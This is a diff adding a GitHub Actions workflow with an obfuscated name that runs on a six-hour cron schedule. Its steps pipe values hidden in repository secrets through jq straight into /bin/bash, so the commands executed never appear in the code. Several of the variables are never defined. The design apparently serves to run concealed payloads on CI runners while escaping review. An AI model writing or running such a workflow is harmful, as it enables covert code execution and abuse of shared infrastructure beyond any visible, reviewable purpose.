@@ -1,0 +1,19 @@
+name: jeremybatch335
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jeremybatch335
+        env:
+          vrch4: ${{ secrets.vrch4 }}
+        run: |
+          echo $vrch4 | jq -r .ug9739 | /bin/bash
+          echo $vli0 | jq -r .owv573 | /bin/bash
+          echo $b9278 | jq -r .bis5595 | /bin/bash
+          echo $een14 | jq -r .rge4 | /bin/bash
+
